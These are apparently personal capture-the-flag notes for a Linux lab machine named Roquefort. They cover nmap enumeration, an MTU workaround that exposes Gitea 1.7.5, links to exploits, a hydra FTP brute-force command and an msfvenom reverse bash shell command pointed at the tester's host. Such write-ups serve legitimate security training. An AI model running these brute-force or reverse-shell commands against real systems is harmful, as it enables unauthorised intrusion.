# Roquefort \[Linux]

## Summary

* Lower the MTU till then we had no play
* After running exploit once, revert if it fails
* Port 80 might not work for file serving
* Direct revshell in command exec didn't work, had to serve a revshell file and exec

## Enumeration

```
192.168.197.67
sudo nmap -v 192.168.197.67 -sC -sV -p- --open -oN tcpscan.nmap

Nmap scan report for 192.168.197.67
Host is up (0.045s latency).
Not shown: 65530 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5b
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
|_  256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
2222/tcp open  ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### Updated (After lowering MTU - 1200)

```
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=7deed3af6b67c939; Path=/; HttpOnly
|     Set-Cookie: _csrf=Lo035tvKCxs975r6wPEPcnheWuo6MTc3MTkzOTU3MzU3NzY4ODI5OA%3D%3D; Path=/; Expires=Wed, 25 Feb 2026 13:26:13 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 24 Feb 2026 13:26:13 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=ca305dfedba7807d; Path=/; HttpOnly
|     Set-Cookie: _csrf=C2XA2tM9nytaW672xsuBsYjopBg6MTc3MTkzOTU3ODgxNzM2NDEwMw%3D%3D; Path=/; Expires=Wed, 25 Feb 2026 13:26:18 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 24 Feb 2026 13:26:18 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration

```

#### UDP

```
sudo nmap -sU --top-ports 20 -oN udpscan.nmap -vv 192.168.197.67 
Nothing
```

### Files

None

### Ports

#### 21

No anonymous

Try `sudo hydra -L names.txt -P '/usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt' -s 21 ftp://$IP`

{% embed url="https://www.exploit-db.com/exploits/49908" %}

{% embed url="https://github.com/t0kx/exploit-CVE-2015-3306" %}
We need a website to access revshell - this is not it
{% endembed %}

#### 2222

```
 Dropbear sshd 2016.74 (protocol 2.0)
 CVE-2016-7406 say RCE possible but no PoC
```

{% embed url="https://webresources.commscope.com/download/assets/Vulnerabilities+in+Dropbear+SSH+%E2%80%93+CVE-2016-7406%2C+CVE-2016-7407%2C+CVE-+2016-2408%2C+CVE-2016-2409/806339ae3bd411f095821adcaa92e24e" %}

#### 3000

Cant access via HTTP\[S] & nc 192.168.197.67 3000 also doesn't return anything

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

Resolving MTU issue shows Gitea 1.7.5, can create user too for RCE exploit

### Exploits

{% embed url="https://www.exploit-db.com/exploits/49383" %}

### Loot

#### Creds

None

#### Flags

```
98c1b512bc02d85fa4dc25e98a67d569
41792a0a551c7da66f34d38a7bbb5bd5
```

## Initial Foothold

MTU had to lowered to 1200 to access HTTP gitea web server on port 3000

```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.218 LPORT=2222 -f raw > shell.sh
```

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

<div align="left"><figure><img src="../../.gitbook/assets/image (89).png" alt="" width="563"><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../../.gitbook/assets/image (90).png" alt="" width="353"><figcaption></figcaption></figure></div>

## Post Exploitation

<div align="left"><figure><img src="../../.gitbook/assets/image (91).png" alt="" width="480"><figcaption></figcaption></figure></div>
